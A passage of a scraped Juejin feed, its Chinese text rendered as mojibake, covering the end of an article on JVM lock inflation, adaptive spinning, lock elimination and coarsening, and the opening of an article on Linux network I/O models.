<li>ä¸º0ï¼šé”æ²¡æœ‰è¢«å ç”¨ï¼Œæ‰§è¡ŒåŠ é”æ“ä½œï¼Œ_count+1ï¼Œ_recursions+1ï¼Œ _woneræŒ‡å‘å½“å‰çº¿ç¨‹</li>
<li>ä¸ä¸º0ï¼šåˆ¤æ–­ _woneræ˜¯å¦æ˜¯å½“å‰çº¿ç¨‹
<ol>
<li>æ˜¯ï¼šç›´æ¥è¿›å…¥åŒæ­¥æ–¹æ³•</li>
<li>å¦ï¼šè¿›å…¥é˜»å¡é˜Ÿåˆ—</li>
</ol>
</li>
</ol>
</li>
<li> å½“å‰çº¿ç¨‹æ‰§è¡Œå®ŒåŒæ­¥ä»£ç å—çš„å†…å®¹ï¼Œç„¶åå”¤é†’ _EntryList ä¸­ç­‰å¾…çš„çº¿ç¨‹æ¥ç«äº‰é”ï¼Œç«äº‰çš„æ—¶æ˜¯éå…¬å¹³çš„</li>
</ol>
<h5 data-id="heading-11">å‡çº§æˆä¸ºé‡é‡çº§é”</h5>
<p>â€ƒâ€ƒå½“å¤šä¸ªçº¿ç¨‹ç«äº‰åŒä¸€ä¸ªé”ï¼Œå¹¶ä¸”è½»é‡çº§é”æ— æ³•é€šè¿‡è‡ªæ—‹æˆåŠŸè·å–æ—¶ï¼Œé”ä¼šè†¨èƒ€ä¸ºé‡é‡çº§é”ã€‚æ­¤æ—¶ï¼ŒJVM ä¼šåœ¨å†…å­˜ä¸­ä¸ºè¯¥å¯¹è±¡åˆ†é…ä¸€ä¸ª <strong>ObjectMonitor</strong> å¯¹è±¡ï¼Œå¹¶å°†å¯¹è±¡å¤´çš„ Mark Word æŒ‡å‘å®ƒï¼Œä»è€Œå°†å¯¹è±¡ä¸ Monitor é”å…³è”èµ·æ¥ï¼Œå®ç°çº¿ç¨‹é—´çš„äº’æ–¥å’Œç­‰å¾…ç®¡ç†ã€‚</p>
<ol>
<li>å½“ Thread-1 è¿›è¡Œè½»é‡çº§åŠ é”æ—¶ï¼ŒThread-0 å·²ç»å¯¹è¯¥å¯¹è±¡åŠ äº†è½»é‡çº§é”
<ol>
<li>Thread-1å°†å¯¹è±¡å¼•ç”¨æŒ‡å‘äº†Objectï¼Œç„¶åå°è¯•CASäº¤æ¢MarkWord,å‘ç°Objectçš„MarkWord æœ€åä¸¤ä½å·²ç»æ˜¯00äº†ï¼Œå·²ç»è¢«å…¶ä»–è½»é‡çº§é”å ç”¨äº†ã€‚æ‰€ä»¥Thread-1CASå¤±è´¥ã€‚</li>
</ol>
</li>
</ol>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c25d52210e7499ca9d4865daa921d47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281861&amp;x-signature=eGy%2BsgvWkdfGpUWMubHP8ge2Q8U%3D" alt="" loading="lazy"/></p>
<ol start="2">
<li>ç”±äºThread-1CASå¤±è´¥ï¼Œé”ä¼šè†¨èƒ€æˆä¸ºé‡é‡çº§é”
<ol>
<li>å³ä¸º Object å¯¹è±¡ç”³è¯· Monitor é”ï¼Œè®© Object æŒ‡å‘é‡é‡çº§é”åœ°å€ã€‚</li>
<li>ç„¶åThread-1è‡ªå·±è¿›å…¥ Monitor çš„ EntryList BLOCKEDè¿›è¡Œç­‰å¾…ã€‚</li>
</ol>
</li>
</ol>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b1e0e5e006545ce84a53fad511faa6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281861&amp;x-signature=saLbjKxqRRb6qQDMB5u0MqkMQZc%3D" alt="" loading="lazy"/></p>
<ol start="3">
<li>å½“ Thread-0 é€€å‡ºåŒæ­¥å—è§£é”æ—¶ï¼Œä½¿ç”¨ cas å°† Mark Word çš„å€¼æ¢å¤ç»™å¯¹è±¡å¤´ï¼Œä¼šå¤±è´¥ã€‚</li>
<li> æ­¤æ—¶ï¼Œçº¿ç¨‹ä¼šè¿›å…¥é‡é‡çº§è§£é”æµç¨‹ï¼šé€šè¿‡å¯¹è±¡å¤´æ‰¾åˆ°å¯¹åº”çš„ <strong>ObjectMonitor</strong>ï¼Œå°† Monitor çš„ Owner è®¾ç½®ä¸º nullï¼Œå¹¶å”¤é†’ Monitor ä¸­ <strong>EntryList</strong> é˜Ÿåˆ—é‡Œçš„é˜»å¡çº¿ç¨‹ï¼Œè®©å®ƒä»¬é‡æ–°ç«äº‰é”ã€‚  </li>
</ol>
<h2 data-id="heading-12">4.é”å’ŒHashCode</h2>
<p>â€ƒâ€ƒåœ¨é”å‡çº§ä¸ºè½»é‡çº§æˆ–è€…é‡é‡çº§é”åï¼ŒMark Wordä¸­ä¿å­˜çš„åˆ†åˆ«æ˜¯çº¿ç¨‹æ ˆå¸§é‡Œçš„é”è®°å½•æŒ‡é’ˆå’Œé‡é‡çº§æŒ‡é’ˆï¼Œå·²ç»æ²¡æœ‰ä½ç½®ä¿å­˜HashCodeï¼ŒGCå¹´é¾„äº†ï¼Œé‚£è¿™äº›ä¿¡æ¯å»å“ªé‡Œäº†å‘¢ï¼Ÿ</p>
<ol>
<li>å¯¹äºæ— é”çŠ¶æ€ï¼šå½“å¯¹è±¡ç¬¬ä¸€æ¬¡è°ƒç”¨hashCode()æ–¹æ³•ï¼Œjvmä¼šç”Ÿæˆhashcodeå¹¶å­˜åœ¨Mark Wordä¸­ã€‚</li>
<li>å¯¹äºåå‘é”ï¼šå¦‚æœä¸€ä¸ªå¯¹è±¡å·²ç»è°ƒç”¨è¿‡hashCode()æ–¹æ³•ï¼Œåˆ™è¿™ä¸ªå¯¹è±¡ä¸èƒ½è¢«è®¾ç½®åå‘é”ã€‚å¦‚æœæ˜¯åœ¨åå‘é”çš„çŠ¶æ€ä¸‹ï¼Œè°ƒç”¨hashCode()æ–¹æ³•ï¼Œä¼šé€ æˆé”çš„å‡çº§ã€‚å®ƒçš„åå‘çŠ¶æ€ä¼šè¢«ç«‹å³æ’¤é”€ï¼Œå¹¶ä¸”é”ä¼šè†¨èƒ€ä¸ºé‡é‡çº§é”ã€‚</li>
<li>å¯¹äºè½»é‡çº§é”ï¼šJVMä¼šåœ¨å½“å‰çº¿ç¨‹çš„æ ˆå¸§è®°å½•ä¸­åˆ›å»ºä¸€ä¸ªé”è®°å½•ç©ºé—´ã€‚ç”¨äºå­˜å‚¨MarkWordçš„ä¿¡æ¯ï¼Œé”é‡Šæ”¾åè¿˜åŸå›å»ã€‚</li>
<li>å¯¹äºé‡é‡çº§é”ï¼šå¯¹è±¡MardWordä¿¡æ¯åˆ™è¢«ä¿å­˜åœ¨Monitorå¯¹è±¡ä¸­ï¼Œé”é‡Šæ”¾åè¿˜åŸå›å»ã€‚</li>
</ol>
<h2 data-id="heading-13">5.é”çš„å…¶ä»–ä¼˜åŒ–</h2>
<h3 data-id="heading-14">5.1 è‡ªæ—‹é”/è‡ªé€‚åº”</h3>
<p>â€ƒâ€ƒJVMçš„è‡ªæ—‹æ¬¡æ•°æ˜¯é€šè¿‡PreBlockSpinå‚æ•°æ§åˆ¶ã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨å¦‚ä¸‹ç½‘å€çœ‹åˆ°</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3db694de02ab4952ae249867d2f08d48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281861&amp;x-signature=3OTFm7EhO7BkcYfsXxJqT6iB%2F1U%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oracle.com%2Fjava%2Ftechnologies%2Fjavase%2Fvmoptions-jsp.html" target="_blank" title="https://www.oracle.com/java/technologies/javase/vmoptions-jsp.html" ref="nofollow noopener noreferrer">www.oracle.com/java/technoâ€¦</a></p>
<p>åœ¨è‡ªé€‚åº”é”å‡ºç°ä¹‹å‰ï¼ŒJVM çš„è‡ªæ—‹æ¬¡æ•°æ˜¯â€œä¸€åˆ€åˆ‡â€çš„ã€‚è€Œè‡ªé€‚åº”è‡ªæ—‹å°†è¿™ç§å›ºå®šæ¬¡æ•°è¿›åŒ–æˆäº†åŸºäºå†å²ç»éªŒçš„åŠ¨æ€é¢„æµ‹ï¼Œ JVMé»˜è®¤çš„è‡ªæ—‹æ¬¡æ•°æ˜¯10ã€‚</p>
<p><strong>1. åŠ¨æ€å¢åŠ </strong></p>
<p>å¦‚æœä¸€ä¸ªçº¿ç¨‹åœ¨æŸä¸ªé”å¯¹è±¡ä¸Šï¼ŒåˆšåˆšæˆåŠŸåœ°é€šè¿‡è‡ªæ—‹è·å¾—è¿‡é”ï¼Œä¸”å½“å‰æŒæœ‰é”çš„çº¿ç¨‹æ­£åœ¨è¿è¡Œä¸­ã€‚</p>
<ul>
<li>åŠ¨ä½œï¼š JVM ä¼šè®¤ä¸ºè¿™æ¬¡è‡ªæ—‹æˆåŠŸçš„æ¦‚ç‡å¾ˆé«˜ã€‚</li>
<li>ç»“æœï¼š åŠ¨æ€åœ°å¢åŠ è‡ªæ—‹æ¬¡æ•°ï¼ˆä¾‹å¦‚ä»é»˜è®¤çš„ 10 æ¬¡å¢åŠ åˆ° 50 æ¬¡ç”šè‡³ 100 æ¬¡ï¼‰ã€‚</li>
<li>ç›®çš„ï¼š å°½é‡é€šè¿‡è‡ªæ—‹æ‹¿åˆ°é”ï¼Œé¿å…çº¿ç¨‹åˆ‡å…¥å†…æ ¸æ€å¯¼è‡´æŒ‚èµ·ï¼Œæå‡æ•ˆç‡ã€‚</li>
</ul>
<p><strong>2. åŠ¨æ€å‡å°‘/å–æ¶ˆ</strong></p>
<p>å¦‚æœå¯¹äºæŸä¸ªé”ï¼Œè‡ªæ—‹å¾ˆå°‘æˆåŠŸè·å¾—è¿‡ã€‚</p>
<ul>
<li>åŠ¨ä½œï¼š JVM è®¤ä¸ºè¿™ä¸ªé”ç«äº‰å¤ªæ¿€çƒˆï¼Œæˆ–è€…æŒæœ‰é”çš„æ—¶é—´å¤ªé•¿ï¼Œè‡ªæ—‹åªæ˜¯åœ¨æµªè´¹ CPUã€‚</li>
<li>ç»“æœï¼š åŠ¨æ€åœ°å‡å°‘è‡ªæ—‹æ¬¡æ•°ï¼Œç”šè‡³åœ¨ä¸‹ä¸€æ¬¡ç›´æ¥è·³è¿‡è‡ªæ—‹é˜¶æ®µã€‚</li>
<li>ç›®çš„ï¼š èŠ‚çœ CPU èµ„æºï¼Œç›´æ¥è®©çº¿ç¨‹è¿›å…¥é˜»å¡çŠ¶æ€ï¼Œç­‰å¾…æ“ä½œç³»ç»Ÿå”¤é†’ã€‚</li>
</ul>
<h3 data-id="heading-15">5.2 é”æ¶ˆé™¤</h3>
<p>â€ƒâ€ƒå½“ JVM çš„å³æ—¶ç¼–è¯‘å™¨ï¼ˆJITï¼‰åœ¨è¿è¡Œæ—¶æ£€æµ‹åˆ°æŸäº›ä»£ç è™½ç„¶ä½¿ç”¨äº†é”ï¼Œä½†å…¶å®æ ¹æœ¬ä¸å­˜åœ¨å…±äº«æ•°æ®ç«äº‰æ—¶ï¼Œå°±ä¼šæŠŠè¿™ä¸ªé”åˆ æ‰ã€‚è¿™ä¸»è¦ä¾é é€ƒé€¸åˆ†æï¼ˆEscape Analysisï¼‰ã€‚å¦‚æœ JVM å‘ç°ä¸€ä¸ªå¯¹è±¡åªä¼šåœ¨å½“å‰çº¿ç¨‹å†…éƒ¨ä½¿ç”¨ï¼ˆä¸ä¼šé€ƒé€¸åˆ°å…¶ä»–çº¿ç¨‹ï¼‰ï¼Œé‚£ç»™å®ƒåŠ é”å°±æ˜¯ç™½è´¹åŠ›æ°”ã€‚</p>
<p>â€ƒâ€ƒæˆ‘ä»¬å¸¸ç”¨çš„ <code>StringBuffer</code> æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå®ƒçš„ <code>append</code> æ–¹æ³•å¸¦äº† <code>synchronized</code>ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªæ —å­ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">concatString</span><span class="hljs-params">(String s1, String s2)</span> {
    <span class="hljs-comment">// StringBuffer æ˜¯å±€éƒ¨å˜é‡ï¼Œä¸ä¼šè¢«å…¶ä»–çº¿ç¨‹è®¿é—®</span>
    <span class="hljs-comment">// å®ƒå±äºâ€œéé€ƒé€¸å¯¹è±¡â€</span>
    <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(); 
    sb.append(s1);
    sb.append(s2);
    <span class="hljs-keyword">return</span> sb.toString();
}
</code></pre>
<p>â€ƒâ€ƒåœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œ<code>sb</code> å¯¹è±¡åªåœ¨ <code>concatString</code> æ–¹æ³•å†…éƒ¨æœ‰æ•ˆã€‚JVMæœ€ç»ˆä¼šå‘ç°ï¼šæ²¡æœ‰ä»»ä½•å…¶ä»–çº¿ç¨‹èƒ½è®¿è¿™ä¸ª <code>sb</code>ã€‚æ­¤æ—¶ï¼Œå®ƒä¼šå¤§èƒ†åœ°å°† <code>append</code> æ–¹æ³•å†…éƒ¨çš„åŒæ­¥é”ç›´æ¥æ¶ˆé™¤ã€‚</p>
<h3 data-id="heading-16">5.3 é”ç²—åŒ–</h3>
<p>â€ƒâ€ƒåŸåˆ™ä¸Šæˆ‘ä»¬å»ºè®®åŒæ­¥å—è¶Šå°è¶Šå¥½ï¼ˆåªåœ¨å¿…è¦æ—¶åŠ é”ï¼‰ã€‚ä½†å¦‚æœ JVM å‘ç°ä¸€ç³»åˆ—è¿ç»­çš„æ“ä½œéƒ½å¯¹<strong>åŒä¸€ä¸ªå¯¹è±¡</strong>åå¤åŠ é”ã€è§£é”ï¼Œç”šè‡³é”å‡ºç°åœ¨å¾ªç¯ä½“å†…éƒ¨ï¼Œå®ƒå°±ä¼šæŠŠåŠ é”çš„èŒƒå›´<strong>æ‰©å¤§</strong>ã€‚åŸå› æ˜¯å› ä¸ºé¢‘ç¹åœ°â€œè·å–-é‡Šæ”¾â€é”ä¼šäº§ç”Ÿå¤§é‡çš„èµ„æºæ¶ˆè€—ã€‚ä¸ºäº†å‡å°‘è¿™ç§æ— è°“çš„æ€§èƒ½æŸè€—ï¼ŒJVM ä¼šå°†å¤šä¸ªè¿ç»­çš„é”åˆå¹¶æˆä¸€ä¸ªèŒƒå›´æ›´å¤§çš„é”ã€‚</p>
<p>æ¯”å¦‚è¯´ä¸‹é¢è¿™æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-comment">// do something</span>
    }
}
</code></pre>
<p>ä¼šä¼˜åŒ–æˆï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">synchronized</span>(lock) {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
         <span class="hljs-comment">// do something</span>
    }
}
</code></pre>
<h2 data-id="heading-17">6.å…¶ä»–</h2>
<p>â€ƒâ€ƒå¯¹äºåå‘é”ï¼Œåœ¨JDK15æ ‡è®°ä¸ºå¼ƒç”¨ï¼Œåœ¨JDK17è¿›è¡Œç›¸å…³å®ç°é€æ­¥ç§»é™¤ã€‚åœ¨javaçš„æŠ€æœ¯æµªæ½®ä¸­å·²ç»æˆä¸ºäº†å‰æµªã€‚ä¸»è¦åŸå› æ˜¯ å®ƒçš„æ€§èƒ½ä¼˜åŠ¿åœ¨ç°ä»£ç¡¬ä»¶å’Œ JVM ä¼˜åŒ–ä¸‹è¶Šæ¥è¶Šå°ï¼Œè€Œå®ç°å¤æ‚åº¦é«˜ã€‚</p>
<p/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linuxçš„ç½‘ç»œæ¨¡å‹]]></title>    <link>https://juejin.cn/post/7600426046425202723</link>    <guid>https://juejin.cn/post/7600426046425202723</guid>    <pubDate>2026-01-29T08:59:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600426046425202723" data-draft-id="7600588379105050676" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linuxçš„ç½‘ç»œæ¨¡å‹"/> <meta itemprop="keywords" content="Linux,æœåŠ¡å™¨"/> <meta itemprop="datePublished" content="2026-01-29T08:59:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€ç¢—é¢421"/> <meta itemprop="url" content="https://juejin.cn/user/3632442146558520"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linuxçš„ç½‘ç»œæ¨¡å‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3632442146558520/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€ç¢—é¢421
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T08:59:44.000Z" title="Thu Jan 29 2026 08:59:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»19åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€ƒâ€ƒæˆ‘ä»¬è®¨è®ºç½‘ç»œ I/O æ¨¡å‹æ—¶ï¼Œé¦–å…ˆè¦ç¡®å®šçš„å°±æ˜¯ <strong>è¯­å¢ƒ</strong>ã€‚å¾ˆå¤šå¼€å‘è€…åœ¨è°ˆè®ºç½‘ç»œIOæ¨¡å‹å®¹æ˜“è¯´ä¸æ¸…æ¥šï¼Œå°±æ˜¯è¯­å¢ƒä¸æ˜ç¡®ã€‚ Java NIOã€Nettyã€ Redisã€Nginxç­‰æ¡†æ¶éƒ½æœ‰è‡ªå·±çš„ç½‘ç»œ I/O æ¨¡å‹ã€‚ä¸è¿‡æ— è®ºä¸Šå±‚æ¡†æ¶å¦‚ä½•æ¼”è¿›ï¼Œå®ƒä»¬éƒ½å¿…é¡»æ„å»ºåœ¨æ“ä½œç³»ç»Ÿæä¾›çš„åº•å±‚æœºåˆ¶ä¹‹ä¸Šã€‚æœ¬æ–‡å°†è¯­å¢ƒé”å®šåœ¨ <strong>Linux æ“ä½œå±‚é¢</strong>ï¼Œå›å½’åˆ°ã€ŠUNIXç½‘ç»œç¼–ç¨‹ã€‹ä¸­ç»å…¸çš„äº”ç§ I/O æ¨¡å‹ï¼š<strong>é˜»å¡I/Oã€éé˜»å¡I/Oã€I/O å¤šè·¯å¤ç”¨ã€ä¿¡å·é©±åŠ¨åŠå¼‚æ­¥ I/O</strong>ã€‚ç†è§£äº†è¿™äº› Linux åŸç”Ÿçš„åº•å±‚ç –çŸ³ï¼Œæ‰èƒ½è®©æˆ‘ä»¬æ›´åŠ ç†è§£ Nettyã€Nginx ç­‰é«˜å¹¶å‘æ¡†æ¶çš„è®¾è®¡çµé­‚ã€‚</p>
<h2 data-id="heading-0">1.æµ‹è¯•ç¯å¢ƒ</h2>
<p><strong>æ“ä½œç³»ç»Ÿï¼š</strong> Ubuntu 24.04.2 LTS</p>
<p><strong>å¼€å‘è½¯ä»¶ï¼š</strong> vscode</p>
<p><strong>gccç‰ˆæœ¬</strong>ï¼šgcc version 13.3.0</p>
<h2 data-id="heading-1">2.æ ¸å¿ƒæ¦‚å¿µï¼šI/O çš„ä¸¤ä¸ªé˜¶æ®µ</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6621a3fbb6e642c5b628e1f63dccb1de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281988&amp;x-signature=CQ5mhMhelOlvq9RynZ%2B3KVzBfkE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">ç¬¬ä¸€é˜¶æ®µï¼šç­‰å¾…æ•°æ®å°±ç»ª</h3>
<ul>
<li>å‘ç”Ÿä½ç½®ï¼š å†…æ ¸ç©ºé—´</li>
<li>åŠ¨ä½œï¼š æ•°æ®åŒ…é€šè¿‡ç½‘ç»œé“¾è·¯åˆ°è¾¾ç½‘å¡ï¼Œç½‘å¡é€šè¿‡ DMA æ–¹å¼å°†æ•°æ®å†™å…¥å†…å­˜ï¼Œéšåå†…æ ¸å°†æ•°æ®æ”¾å…¥å¯¹åº”çš„ Socket æ¥æ”¶ç¼“å†²åŒº</li>
<li>çŠ¶æ€ï¼š æ­¤æ—¶æ•°æ®å·²ç»åœ¨æ“ä½œç³»ç»Ÿæ‰‹é‡Œï¼Œåº”ç”¨ç¨‹åºè¿˜æ‹¿ä¸åˆ°</li>
</ul>
<h3 data-id="heading-3">ç¬¬äºŒé˜¶æ®µï¼šå°†æ•°æ®ä»å†…æ ¸æ‹·è´åˆ°ç”¨æˆ·è¿›ç¨‹</h3>
<ul>
<li>å‘ç”Ÿä½ç½®ï¼š ä»å†…æ ¸ç©ºé—´åˆ°ç”¨æˆ·ç©ºé—´</li>
<li>åŠ¨ä½œï¼š æ“ä½œç³»ç»Ÿå°†æ•°æ®ä»å†…æ ¸ç¼“å†²åŒº å¤åˆ¶ åˆ°ä½ åœ¨ç¨‹åºä¸­å®šä¹‰çš„ç¼“å†²åŒº</li>
<li>çŠ¶æ€ï¼š åªæœ‰è¿™ä¸ªé˜¶æ®µå®Œæˆäº†ï¼Œä½ çš„ä¸šåŠ¡é€»è¾‘æ‰èƒ½çœŸæ­£è¯»åˆ°è¿™äº›æ•°æ®</li>
</ul>
<h2 data-id="heading-4">3.é˜»å¡I/O (Blocking I/O)</h2>
<p>é˜»å¡IOæ˜¯æœ€ä¼ ç»Ÿçš„æ¨¡å‹ï¼Œè¿›ç¨‹å‘èµ· recvfrom è°ƒç”¨åï¼Œä¼šä¸€ç›´é˜»å¡ï¼Œç›´åˆ°æ•°æ®å‡†å¤‡å¥½å¹¶æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ã€‚</p>
<p>ç‰¹ç‚¹æ˜¯å®ç°ç®€å•ï¼Œä½†æ˜¯ä¸€ä¸ªçº¿ç¨‹åªèƒ½å¤„ç†ä¸€ä¸ªè¿æ¥ï¼Œå¹¶å‘èƒ½åŠ›å·®ã€‚</p>
<h3 data-id="heading-5">ç¬¬ä¸€é˜¶æ®µ</h3>
<p>ç”¨æˆ·è¿›ç¨‹è°ƒç”¨recvfromå°è¯•è¯»å–æ•°æ®ï¼Œæ­¤æ—¶æ— æ•°æ®å°šæœªåˆ°è¾¾ï¼Œå†…æ ¸ä¹Ÿåœ¨ç­‰å¾…æ•°æ®çš„åˆ°æ¥ï¼Œç”¨æˆ·è¿›ç¨‹å¤„äºé˜»å¡çŠ¶æ€ã€‚</p>
<h3 data-id="heading-6">ç¬¬äºŒé˜¶æ®µ</h3>
